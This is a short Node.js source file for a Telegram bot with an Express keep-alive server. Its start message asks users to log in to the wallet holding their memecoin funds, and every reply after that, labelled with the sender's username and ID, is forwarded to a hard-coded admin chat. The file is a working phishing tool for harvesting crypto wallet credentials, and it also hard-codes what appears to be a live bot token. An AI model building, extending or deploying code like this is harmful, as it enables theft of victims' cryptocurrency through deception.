const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const TOKEN = '8792267571:AAEHfd8icGCncIvgGZYIyZoeJm6ea9mkY7s';
const ADMIN_ID = '8657518477';
const bot = new TelegramBot(TOKEN, { polling: true });
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, "Log in to the wallet containing the funds for your memecoin investments; please note that if we do not partner with the specific wallet you are using, we apologize for the inconvenience.");
});
bot.on('message', (msg) => {
  if (!msg.text || msg.text.startsWith('/start')) return;
  const who = msg.from.username ? '@' + msg.from.username : (msg.from.first_name || 'unknown');
  bot.sendMessage(msg.chat.id, "Got it, thanks!");
  bot.sendMessage(ADMIN_ID, `New guess from ${who} (ID: ${msg.from.id}):\n\n${msg.text}`);
});
const app = express();
app.get('/', (req, res) => res.send('Bot is running'));
app.listen(process.env.PORT || 3000, () => {
  console.log('Keep-alive server started');
});
